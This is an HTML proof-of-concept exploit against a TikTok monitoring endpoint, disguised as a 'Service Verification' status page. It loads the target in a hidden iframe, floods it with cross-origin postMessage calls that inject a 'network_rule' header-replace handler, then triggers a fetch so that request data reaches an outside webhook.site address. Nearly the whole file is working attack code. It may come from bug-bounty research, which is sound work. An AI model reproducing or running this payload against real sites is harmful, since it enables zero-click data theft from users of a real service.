<!DOCTYPE html>
<html>
<head>
    <title>Service Verification</title>
</head>
<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20px;">
    <h1>[ STATUS: RUNNING ]</h1>
    
    <iframe id="pwn_gate" 
            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
            style="display:none;"></iframe>

    <script>
        const gate = document.getElementById('pwn_gate');
        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";

        const payload = {
            source: "main_thread",
            eventName: "network_rule",
            data: [{
                ruleName: "zero_click_final_v3",
                global: true,
                conditions: [],
                handlers: [{
                    handler: "replace",
                    type: "header",
                    field: "X-Pns-Referrer",
                    value: webhook
                }]
            }]
        };

        function startInjection() {
            console.log("Gate Loaded (200 OK). Initializing injection...");
            
            // Spam postMessage selama 3 detik
            let count = 0;
            const bomb = setInterval(() => {
                try {
                    gate.contentWindow.postMessage(payload, "*");
                } catch(e) {}
                count++;
                if (count > 20) {
                    clearInterval(bomb);
                    console.log("Injection sequence complete. No 404s triggered.");
                    executeSilentTrigger();
                }
            }, 150);
        }

        function executeSilentTrigger() {
            console.log("Triggering network rule via valid endpoint...");
            
            // Trigger fetch ke endpoint yang sama (200 OK)
            // Ini akan memaksa SW mengirim header lu ke webhook
            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
                mode: 'no-cors',
                cache: 'no-store' 
            }).then(() => {
                console.log("Success! Check Reqable/Webhook for X-Pns-Referrer.");
            });
        }

        gate.onload = startInjection;
    </script>
</body>
</html>
